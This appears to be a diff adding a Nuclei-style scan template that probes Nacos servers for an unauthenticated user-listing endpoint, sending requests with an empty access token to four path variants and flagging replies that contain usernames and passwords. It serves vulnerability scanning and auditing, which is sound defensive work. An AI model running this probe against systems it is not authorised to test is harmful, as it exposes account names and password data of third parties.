@@ -1,0 +1,22 @@
+id: nacos-unauth
+ 
+info:
+  name: nacos-unauth
+  author: sec
+  severity: high
+  tags: nacos
+ 
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken="
+      - "{{RootURL}}/nacos/v1/auth/users/?pageNo=1&pageSize=9&search=accurate&accessToken="
+      - "{{RootURL}}/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken="
+      - "{{RootURL}}/v1/auth/users/?pageNo=1&pageSize=9&search=accurate&accessToken="
+    matchers:
+      - type: word
+        words:
+          - "username"
+          - "password"
+          - "page"
+        condition: and
